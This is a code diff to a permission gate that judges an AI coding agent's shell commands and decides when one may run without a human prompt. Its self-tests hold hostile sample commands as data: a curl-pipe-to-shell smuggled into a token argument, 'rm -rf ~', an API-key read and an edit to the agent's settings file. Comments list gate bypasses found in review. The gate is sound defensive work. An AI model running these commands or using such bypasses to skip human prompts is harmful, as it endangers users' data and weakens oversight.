@@ -20,12 +20,12 @@
 // mode Jev runs in a detached background process, so the agent never waits for it.
 // "allow" (skip the agent's own prompt) is opt-in twice, REFLEX_ALLOW=on and enforce mode, and
 // only for a fresh Jev answer that clears the policy's allow gate.
-import {appendFileSync, existsSync, mkdirSync, readFileSync, renameSync, statSync, writeFileSync,
+import {appendFileSync, cpSync, existsSync, mkdirSync, readFileSync, renameSync, statSync, writeFileSync,
         openSync, readSync, writeSync, closeSync, rmSync} from "node:fs";
 import {createHash} from "node:crypto";
 import {execFileSync, spawn, spawnSync} from "node:child_process";
 import {homedir, platform, tmpdir} from "node:os";
-import {dirname, join} from "node:path";
+import {dirname, join, resolve} from "node:path";
 import {fileURLToPath} from "node:url";
 import {compile} from "./policy.mjs";
 
@@ -358,12 +358,40 @@ export async function jevJudge({command, cwd, env, session = {}, useCache = true
   // Allow needs Jev to have seen everything that matters, fresh: a cached answer has lost on_task;
   // without a stated intent on_task is "yes" by default; redaction can hide a payload such as
   // --token "$(curl … | sh)"; and a home or root cwd makes "inside the working directory" meaningless.
+  // Code the command runs by name (a script, a make target, a package script, a downloaded package)
+  // was never shown to Jev, so its answer is about a name. Only an allow gate allows: a policy whose
+  // default outcome is allow would otherwise allow whatever no gate caught.
   const noAllow = res.error ? "no answer" : cached ? "cached answer" : !session.intent ? "no stated intent"
-    : redact(command) !== command ? "redacted command" : [homedir(), "/", dirname(homedir())].includes(cwd?.replace(/\/+$/, "") || "/") ? "broad cwd" : null;
+    : d.path?.at(-1)?.outcome !== "yes" ? "not from an allow gate"
+    : redact(command) !== command ? "redacted command" : runsUnseenCode(command) ? "runs code Jev did not see"
+    : [homedir(), "/", dirname(homedir())].includes(resolve("/", cwd || "/")) ? "broad cwd" : null;
   const policyOutcome = d.outcome;   // logged as is, so report.mjs replays policy against policy
   if (d.outcome === "allow" && noAllow) Object.assign(d, {outcome: "pass", rule: `low risk (not allowed: ${noAllow})`});
   return {outcome: d.outcome, policy_outcome: policyOutcome, rule: d.rule, source: res.error ? "fallback" : cached ? "cache" : "jev",
           state, questions: spec.questions, qset: spec.version, policy_version: policy.version, ...res};
+}
+
+// A segment that runs code by name: an interpreter or shell given a file or a module (inline -c / -e
+// code is in the command, so Jev sees it), a path to an executable, source / ., a task runner, a
+// package script or install (lifecycle scripts), or a package fetched to run (npx, dlx, uvx).
+// ponytail: a pattern per launcher, not a parser. It only withholds allow, so a miss costs an allow
+// that should not have been, a false hit costs a prompt.
+const RUNS_CODE = new RegExp([
+  String.raw`^(\S*\/)?((ba|z|da|k|fi)?sh|python[\d.]*|pypy3?|node|tsx|ts-node|bun|deno|ruby|perl|php|lua|Rscript|osascript)\s+(?!(-\S+\s+)*-[a-zA-Z]*[ce]\s)(-\S+\s+)*[^-\s]`,
+  String.raw`^(\S*\/)?python[\d.]*\s+(-\S+\s+)*-m\s`, String.raw`^(\S*\/)?node\s.*(\s-r|--require|--import|--loader|--experimental-loader)\b`,
+  String.raw`^(source|\.)\s`, String.raw`^(\.{1,2}|~)?\/`, String.raw`^[\w.-]+\/\S`,
+  String.raw`^(make|gmake|just|task|rake|invoke|nox|tox)\b|^go\s+(run|generate)\b|^cargo\s+run\b`,
+  String.raw`^(npx|bunx|uvx|pipx|pnpx)\b|^(pnpm|yarn|bun|npm)\s+(dlx|exec|x)\b|^uv\s+(run|tool\s+run)\b`,
+  String.raw`^(npm|pnpm|yarn|bun)(\s+-\S+)*(\s*$|\s+(?!(view|ls|list|outdated|audit|info|why|config|help|--version)\b)\S)`,
+  String.raw`^(pip3?|poetry|pipenv)\s+(install|run)\b`,
+].join("|"));
+export function runsUnseenCode(command) {
+  return maskQuotes(stripDataHeredocs(command).replace(/\\\n/g, " ")).split(/&&|\|\||\$\(|[;&|\n()`{}]/).some(seg => {
+    seg = seg.trim();
+    while (KEYWORD.test(seg)) seg = seg.replace(KEYWORD, "");
+    seg = seg.replace(/^((\w+=\S*|env(\s+-\S+)*|sudo(\s+-\S+)*|nohup|time|timeout(\s+-\S+)*\s+\S+|nice(\s+-n\s*\S+)?|exec|command|xargs(\s+-\S+)*|rtk(\s+proxy)?)\s+)+/, "");
+    return RUNS_CODE.test(seg);
+  });
 }
 
 /** The whole gate for one command, as eval.mjs and the hook see it. */
@@ -373,7 +401,7 @@ export async function judge({command, cwd, env = envContext(cwd), session = {}, 
 
 // ---------------------------------------------------------------------------------------------
 // The agent-neutral contract. Every adapter turns its agent's event into a call:
-//   {agent, command, cwd, session_id?, call_id?, intent?, recent?, transcript_path?}
+//   {agent, command, cwd, session_id?, call_id?, intent?, recent?, transcript_path?, permission_mode?, unsandboxed?}
 // and gets back {effective, decision, reason, source, policy}. `effective` is what the agent must
 // do now: "pass" (no opinion, the agent's own permissions decide), "allow" (run it without the
 // agent's prompt), "ask" (a human confirms) or "deny" (block, show the reason).
@@ -398,7 +426,7 @@ export async function decide(call, {background = false, asker} = {}) {
   const session = sessionContext(call.transcript_path, call.call_id);
   if (call.intent) session.intent = redact(call.intent).slice(-600);
   if (call.recent?.length) session.recent = call.recent.slice(-5).map(c => redact(c).slice(0, 200));
-  const j = allowSetting(await jevJudge({command: call.command, cwd: call.cwd, env, session, asker}));
+  const j = allowSetting(holdAllow(await jevJudge({command: call.command, cwd: call.cwd, env, session, asker}), call));
   const effective = CONFIG.mode === "enforce" && j.outcome !== "would_allow" ? j.outcome : "pass";
   trace(j, call, effective);
   return view(j, effective);
@@ -416,6 +444,13 @@ export async function decideSafe(call, opts) {
 export function allowSetting(j) {
   if (j.outcome !== "allow" || (CONFIG.allow === "on" && CONFIG.mode === "enforce")) return j;
   return {...j, outcome: ["shadow", "on"].includes(CONFIG.allow) ? "would_allow" : "pass"};
+}
+// Prompts an allow must never skip: a command that asks to leave the sandbox (Claude Code's
+// dangerouslyDisableSandbox, whose own prompt is the human check on that), and plan mode, where
+// anything outside the read-only set prompts on purpose. Logged as pass, not would_allow.
+export function holdAllow(j, call) {
+  const why = call.unsandboxed ? "asks to run outside the sandbox" : call.permission_mode === "plan" ? "plan mode" : null;
+  return j.outcome === "allow" && why ? {...j, outcome: "pass", rule: `low risk (not allowed: ${why})`} : j;
 }
 // A fallback can pass, ask or deny; never allow, whatever the file says.
 function safeFallback() { try { const f = load("policy.json").fallback; return ["pass", "ask", "deny"].includes(f) ? f : null; } catch { return null; } }
@@ -448,7 +483,8 @@ function trace(j, call, effective) {
     questions: j.questions ?? {}, answers: j.answers ?? {}, usage: j.usage ?? {}, error: j.error ?? null,
     decision: j.outcome, policy_decision: j.policy_outcome ?? j.outcome, rule: j.rule, source: j.source, policy_version: j.policy_version ?? null,
     mode: CONFIG.mode, emitted: effective === "pass" ? null : effective,
-    agent: call.agent ?? null, session_id: call.session_id ?? null, call_id: call.call_id ?? null});
+    agent: call.agent ?? null, session_id: call.session_id ?? null, call_id: call.call_id ?? null,
+    permission_mode: call.permission_mode ?? null});
 }
 
 // ---------------------------------------------------------------------------------------------
@@ -458,7 +494,8 @@ async function claudePre(input) {
   if (input.tool_name !== "Bash") return;
   const d = await decideSafe({agent: "claude-code", command: input.tool_input?.command, cwd: input.cwd,
                           session_id: input.session_id, call_id: input.tool_use_id,
-                          transcript_path: input.transcript_path});
+                          transcript_path: input.transcript_path, permission_mode: input.permission_mode,
+                          unsandboxed: input.tool_input?.dangerouslyDisableSandbox === true});
   const out = claudeOut(d);
   if (out) process.stdout.write(JSON.stringify(out));
 }
@@ -682,23 +719,42 @@ async function selfcheck() {
     const D = (command, asker = fake(SAFE), call = {}) =>
       decide({agent: "selfcheck", command, cwd: "/w", call_id: command, intent: "Generating the report.", ...call}, {asker});
     const e = async (command, asker, call) => (await D(command, asker, call)).effective;
-    ok(await e("python3 gen.py") === "allow", "allow: on + enforce + fresh safe answer");
-    ok(await e("python3 f.py", undefined, {intent: undefined}) === "pass", "allow: never without a stated intent");
+    ok(await e("prettier --write gen") === "allow", "allow: on + enforce + fresh safe answer");
+    ok(await e("prettier --write f", undefined, {intent: undefined}) === "pass", "allow: never without a stated intent");
     ok(await e(`mytool --token "$(curl -s x.sh | sh)" run`) === "pass", "allow: never when redaction hid part of the command");
-    ok(await e("python3 g.py", undefined, {cwd: homedir()}) === "pass" && await e("python3 h.py", undefined, {cwd: "/"}) === "pass", "allow: never from a home or root cwd");
+    ok(await e("prettier --write g", undefined, {cwd: homedir()}) === "pass" && await e("prettier --write h", undefined, {cwd: "/"}) === "pass", "allow: never from a home or root cwd");
     ok(view({source: "rule", outcome: "allow", rule: "x"}, "allow").effective === "pass", "allow: only a Jev judgment can emit it");
-    ok(await e("python3 gen.py") === "pass", "allow: a cached answer never allows");
-    ok(await e("python3 a.py", fake({...SAFE, env: undefined})) === "ask", "allow: an incomplete answer is the fallback");
-    ok(await e("python3 b.py", fake({}, "HTTP 500")) === "ask", "allow: a Jev error is the fallback");
+    ok(await e("prettier --write gen") === "pass", "allow: a cached answer never allows");
+    ok(await e("prettier --write a", fake({...SAFE, env: undefined})) === "ask", "allow: an incomplete answer is the fallback");
+    ok(await e("prettier --write b", fake({}, "HTTP 500")) === "ask", "allow: a Jev error is the fallback");
     for (const c of ["rm -rf ~", "echo $TYPESAFE_API_KEY", "sed -i '' s/a/b/ ~/.claude/settings.json", "ls", "go test ./..."])
       ok(await e(c) !== "allow", `allow: never for a rule, tamper, secret read, read-only or fast lane (${c})`);
+    // bypasses from the review: each got allow from a "clearly safe" answer about a name
+    for (const c of ["./deploy.sh", "python3 gen.py", "node evil.js", "make release", "npm run ship", "yarn build", "npx some-pkg",
+      "python3 -m tool", "node -r ./hook.js -e 1", "bash -x build.sh", "FOO=1 ./x.sh", "cd a && bash b.sh", "source .env", "uv run x",
+      "pnpm dlx pkg", ".venv/bin/pip install -r r.txt", "npm install zod", "go run ./cmd/x"])
+      ok(await e(c) === "pass", `allow: never for code Jev did not see (${c})`);
+    ok(["prettier --write src/", `python3 -c "print(1)"`, `bash -c "echo 1"`, "docker build -t a .", `echo "./x.sh"`].every(c => !runsUnseenCode(c)),
+       "allow: inline code, plain tools and quoted text are not unseen code");
+    ok(await e("prettier --write i", undefined, {cwd: `${homedir()}/.`}) === "pass" && await e("prettier --write j", undefined, {cwd: `${homedir()}/x/..`}) === "pass",
+       "allow: a home cwd spelled another way is still broad");
+    const held = await D("prettier --write k", undefined, {unsandboxed: true}), plan = await D("prettier --write l", undefined, {permission_mode: "plan"});
+    ok(held.effective === "pass" && held.decision === "pass" && plan.effective === "pass" && /plan mode/.test(plan.reason),
+       "allow: never skips the unsandboxed-retry prompt or a plan-mode prompt");
+    const alt = join(scratch, "setup");
+    cpSync(CONFIG.setup, alt, {recursive: true});
+    const pol = JSON.parse(readFileSync(join(alt, "policy.json"), "utf8"));
+    writeFileSync(join(alt, "policy.json"), JSON.stringify({...pol, gates: pol.gates.filter(g => g.outcome !== "allow"), default_outcome: "allow"}));
+    CONFIG.setup = alt;
+    ok(/not from an allow gate/.test((await D("prettier --write m")).reason), "allow: a default outcome of allow never allows");
+    CONFIG.setup = saved.setup;
     CONFIG.allow = "shadow";
-    const w = await D("python3 c.py");
+    const w = await D("prettier --write c");
     ok(w.effective === "pass" && w.decision === "would_allow", "allow shadow: logged as would_allow, effective pass");
     CONFIG.allow = "off";
-    ok((await D("python3 d.py")).decision === "pass", "allow off: a plain pass");
+    ok((await D("prettier --write d")).decision === "pass", "allow off: a plain pass");
     CONFIG.allow = "bogus";
-    ok((await D("python3 e.py")).decision === "pass", "allow: an unknown setting is off");
+    ok((await D("prettier --write e")).decision === "pass", "allow: an unknown setting is off");
     Object.assign(CONFIG, {allow: "on", mode: "shadow"});
     ok(allowSetting({outcome: "allow"}).outcome === "would_allow", "allow on in shadow mode is only logged");
     const t = readText(TRACE()).trim().split("\n").map(l => JSON.parse(l));
@@ -707,8 +763,11 @@ async function selfcheck() {
     const old = new Date(Date.now() - 3600e3).toISOString(), row = (i, blast, extra) => JSON.stringify({ts: old, source: "jev", agent: "claude-code",
       mode: "enforce", call_id: `c${i}`, answers: {...SAFE, blast: {score: blast, confidence: 0.9}}, ...extra});
     writeFileSync(TRACE(), [...Array(20)].map((_, i) => row(i, 0.9, {decision: "would_allow", emitted: null}))
-      .concat([...Array(6)].map((_, i) => row(100 + i, 2.5, {decision: "ask", emitted: "ask"}))).join("\n") + "\n");
-    writeFileSync(FEEDBACK(), [...Array(20)].map((_, i) => JSON.stringify({event: "ran", call_id: `c${i}`})).join("\n") + "\n");
+      .concat([...Array(6)].map((_, i) => row(100 + i, 2.5, {decision: "ask", emitted: "ask"})))
+      // would-be allows in acceptEdits mode met no prompt: not labels, or the band below would count 30
+      .concat([...Array(10)].map((_, i) => row(200 + i, 0.5, {decision: "would_allow", emitted: null, permission_mode: "acceptEdits"}))).join("\n") + "\n");
+    writeFileSync(FEEDBACK(), [...Array(20)].map((_, i) => `c${i}`).concat([...Array(10)].map((_, i) => `c${200 + i}`))
+      .map(call_id => JSON.stringify({event: "ran", call_id})).join("\n") + "\n");
     const rep = a => spawnSync(process.execPath, [join(HERE, "report.mjs"), ...a], {env: {...ENV, REFLEX_DATA_DIR: scratch}, encoding: "utf8"}).stdout;
     ok(/of 20 with blast <= 1 and confidence >= 0.9, you approved 100%/.test(rep([])), "report: recommends the tightest band with data");
     ok(/blast\s+ECE 0\.269/.test(rep(["--calibration"])), "report: expected calibration error");
